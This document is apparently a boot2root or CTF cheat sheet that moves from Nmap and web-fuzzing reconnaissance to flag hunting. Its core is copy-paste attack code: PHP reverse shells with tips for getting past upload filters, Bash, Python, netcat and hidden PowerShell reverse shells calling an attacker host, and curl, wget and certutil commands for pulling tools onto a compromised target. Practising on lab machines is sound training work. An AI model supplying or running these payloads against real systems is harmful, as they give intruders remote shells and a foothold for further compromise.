# Boot2Root: Reconnaissance, Reverse Shells, and File Transfers

## 1. Fast Nmap Scanning Profiles

Run scans in two passes: fast discovery, then deep service scan.

```bash
# Pass 1: Fast full port scan (finds all open ports quickly)
nmap -p- --min-rate 1000 -T4 -Pn <TARGET_IP> -oN ports.txt

# Pass 2: Targeted deep service detection and default scripts on open ports
# Example with ports 22, 80:
nmap -sC -sV -p 22,80 <TARGET_IP> -oN services.txt

# Quick UDP scan on top ports (DNS, SNMP, NTP):
nmap -sU --top-ports 20 <TARGET_IP> -oN udp.txt
```

---

## 2. Web Directory and Subdomain Discovery

### Directory Fuzzing
```bash
# Fast directory discovery with status code filtering
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302

# Standard Gobuster scan
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Gobuster scan searching for specific file extensions
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,phtml,html,txt
```

### Virtual Host / Subdomain Fuzzing
When web server serves different sites based on the HTTP Host header:
```bash
ffuf -u http://<TARGET_IP> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs <DEFAULT_PAGE_SIZE>
```

---

## 3. Reverse Shell Payloads

Set up your listener on your attacker machine first:
```bash
nc -lvnp 4444
```

### Standalone PHP Reverse Shells (Upload as .phtml, .php5, or .php)
When `.php` is blocked on an upload form (like `/panel/`), save this script as `shell.phtml` or `shell.php5`:

```php
<?php
$sock = fsockopen("<ATTACKER_IP>", 4444);
$proc = proc_open("/bin/sh", [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
?>
```

Compact one-line PHP shell:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"); ?>
```

### Linux One-Liners (Terminal / Command Injection):
```bash
# Bash TCP
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Netcat FIFO (when nc -e is not supported)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

### Windows Shells (PowerShell):
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## 4. TTY Shell Stabilization (Linux)

When inside a basic netcat shell, stabilize it so `Ctrl+C` does not kill your session:

```bash
# Inside reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# If python3 is missing, try:
python -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell:
Press Ctrl + Z

# In your attacker terminal:
stty raw -echo; fg

# Inside restored shell:
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116
```

---

## 5. File Transfers to Target

Host files from your attacker machine:
```bash
# In directory containing tools (linpeas.sh, winpeas.exe, etc.):
python3 -m http.server 8000
```

### Download on Target Linux:
```bash
curl http://<ATTACKER_IP>:8000/linpeas.sh -o /tmp/lp.sh
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/lp.sh
```

### Download on Target Windows (PowerShell / CMD):
```powershell
# PowerShell Invoke-WebRequest
iwr -uri http://<ATTACKER_IP>:8000/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe

# Certutil (CMD)
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/winPEASx64.exe C:\Windows\Temp\wp.exe
```

---

## 6. Linux Flag Hunting Commands

Once you obtain a shell, locate user and root flags:

```bash
# Search for standard user flag files
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null

# Search for any file containing the word "flag"
find / -name "*flag*" 2>/dev/null

# Grep for flag patterns inside web directories or home folders
grep -rnoaEi '(flag|THM|HTB)\{[^}]+\}' /var/www/ 2>/dev/null
grep -rnoaEi '(flag|THM|HTB)\{[^}]+\}' /home/ 2>/dev/null
```
